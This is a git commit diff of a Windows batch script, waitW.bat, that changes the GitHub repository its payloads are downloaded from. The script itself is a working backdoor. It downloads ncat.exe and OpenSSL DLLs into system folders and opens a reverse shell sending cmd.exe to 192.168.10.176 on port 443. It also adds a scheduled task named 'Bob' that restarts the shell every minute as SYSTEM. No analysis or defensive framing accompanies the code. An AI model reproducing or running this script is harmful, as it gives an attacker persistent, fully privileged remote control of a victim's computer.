9c9927e81e55904ff62fa96d0037a8af57d22de0
Ax0my10rk <dapelly4@gmail.com>
2025-03-29 04:58:56 -0400

    Update waitW.bat

--- waitW.bat
+++ waitW.bat
@@ -1,7 +1,7 @@
 @echo off
-curl -L -o "C:\Windows\Temp\ncat.exe" "https://github.com/Ax0my10rk/B/raw/refs/heads/main/ncat.exe"
-curl -L -o "C:\Windows\SysWOW64\libcrypto-3.dll" "https://github.com/Ax0my10rk/B/raw/refs/heads/main/libcrypto-3.dll"
-curl -L -o "C:\Windows\SysWOW64\libssl-3.dll" "https://github.com/Ax0my10rk/B/raw/refs/heads/main/libssl-3.dll"
+curl -L -o "C:\Windows\Temp\ncat.exe" "https://github.com/Ax0my10rk/A/raw/refs/heads/main/ncat.exe"
+curl -L -o "C:\Windows\SysWOW64\libcrypto-3.dll" "https://github.com/Ax0my10rk/A/raw/refs/heads/main/libcrypto-3.dll"
+curl -L -o "C:\Windows\SysWOW64\libssl-3.dll" "https://github.com/Ax0my10rk/A/raw/refs/heads/main/libssl-3.dll"
 timeout /t 1 >nul
 start "" /B "C:\Windows\Temp\ncat.exe" 192.168.10.176 443 -e cmd.exe
 schtasks /create /tn "Bob" /tr "\"C:\Windows\Temp\ncat.exe\" 192.168.10.176 443 -e cmd.exe" /sc minute /mo 1 /ru SYSTEM /rl HIGHEST /f
